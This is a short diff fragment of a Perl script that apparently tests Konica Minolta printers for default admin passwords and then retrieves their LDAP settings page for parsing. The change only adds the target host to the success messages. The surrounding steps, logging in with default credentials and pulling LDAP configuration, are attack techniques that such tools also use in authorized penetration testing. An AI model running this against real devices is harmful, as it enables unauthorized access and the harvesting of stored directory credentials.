@@ -62,8 +62,8 @@ my $response = $browser->post("http$web://$TARGET:$PORTS/F0_17785_AdminLogin.cgi
 my $content = $response->content();
 if ($content =~ /H60_17785_SysStat.htm/)
         {
-            print "\nSUCCESS : Minolta Konica default password=$PWD\n";
-            print OUTFILE "\nSUCCESS : Minolta Konica default password=$PWD\n";
+            print "\n$TARGET : SUCCESS : Minolta Konica default password=$PWD\n";
+            print OUTFILE "\n$TARGET : SUCCESS : Minolta Konica default password=$PWD\n";
 
 # retrieve the ldap setting for parsing
             $response = $browser->get("http$web://$TARGET:$PORTS/H127_17785_NLDAP.htm");
